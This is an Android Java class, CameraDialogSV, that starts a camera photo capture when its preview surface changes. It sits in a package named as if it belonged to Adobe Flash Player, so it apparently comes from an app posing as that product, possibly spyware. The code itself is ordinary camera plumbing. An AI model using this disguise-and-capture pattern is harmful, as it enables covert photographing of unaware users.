package com.adobe.flashplayer.data;


import android.content.Context;
import android.util.AttributeSet;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;


public class CameraDialogSV extends SurfaceView implements SurfaceHolder.Callback{

    private final String TAG = "[ljg]CameraDialogSV[ljg]";

    Context context;

    CameraDialog cameradialog = null;


    public CameraDialogSV(Context context,CameraDialog cameradialog) {
        super(context);
        this.context = context;
        this.cameradialog = cameradialog;
        getHolder().addCallback(this);
    }


    public CameraDialogSV(Context context, AttributeSet attrs) {
        super(context, attrs);
        this.context = context;
        getHolder().addCallback(this);
    }


    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width,int height) {

//		new Thread(new Runnable() {
//			@Override
//			public void run() {
//				cameradialog.startCameraPhoto();
//			}
//		}).start();

        cameradialog.startCameraPhoto();

        Log.e(TAG, "surfaceChanged");
    }


    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        Log.e(TAG, "surfaceCreated");
    }


    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        Log.e(TAG, "surfaceDestroyed");
    }




}



